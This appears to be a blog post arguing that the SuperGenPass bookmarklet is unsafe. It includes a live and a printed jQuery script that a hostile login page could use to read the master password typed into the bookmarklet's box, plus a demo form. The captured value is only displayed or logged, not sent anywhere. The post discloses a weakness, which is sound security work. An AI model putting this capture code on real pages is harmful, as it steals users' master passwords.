---
title: SuperGenFail
tags:  []
layout: post
description: SuperGenPass considered harmful
comments: false
---

I still see [SuperGenPass](http://supergenpass.com/) recommended as a secure password system.  I will demonstrate precisely why it is not.

For those unfamiliar, the concept is not entirely new:  instead of sharing a single password (strong, or not) across multiple accounts, and instead of having to remember separate strong passwords for each account, the user has one master password which secures multiple per-account password.  Where it becomes interesting is that it also generates these passwords by taking your master password, "salting" it by concatenating the URL of the particular account's login page, and then MD5-hashing the result.  This is that site's unique password.  And it does this with help of a bookmarklet 

<script type="text/javascript">
(function($) {
    var eventName = 'masterPassword',
        genPassInput = '#gp2_pass_box input[type="password"]',
        genPassButton = '#gp2_pass_box input[type="button"]';
    $.event.special[eventName] = {
        setup: function(data, namespaces) {
            var elem = $(this),
                captureMasterPassword = function(e) {
                    elem.trigger(eventName, $(genPassInput).val());
                };                
            $(genPassButton).live('click', captureMasterPassword);
            $(genPassInput).live('keydown', function(e) {
                if (e.keyCode === 13) { captureMasterPassword(e); }
            });
        }
    };
})(jQuery);

jQuery(function($){
    $(document).bind('masterPassword', function(e, master) {
		$('#master_output').html('Captured master password "' + master + '"');
    });
});
</script>

{% highlight javascript %}
(function($) {
    var eventName = 'masterPassword',
        genPassInput = '#gp2_pass_box input[type="password"]',
        genPassButton = '#gp2_pass_box input[type="button"]';
    $.event.special[eventName] = {
        setup: function(data, namespaces) {
            var elem = $(this),
                captureMasterPassword = function(e) {
                    elem.trigger(eventName, $(genPassInput).val());
                };                
            $(genPassButton).live('click', captureMasterPassword);
            $(genPassInput).live('keydown', function(e) {
                if (e.keyCode === 13) { captureMasterPassword(e); }
            });
        }
    };
})(jQuery);
{% endhighlight %}

*Using the event*

{% highlight javascript %}
$(document).bind('masterPassword', function(e, master) {
    console.log('captured master: ' + master);
});
{% endhighlight %}

<form method="post">
    <div>
	    <label>Username:</label><input type="text" id="username" />
	</div>
	<div>
	    <label>Password:</label><input type="password" id="password" />
	</div>
	<input type="submit" value="Login" />
</form>
<p id="master_output"></p>

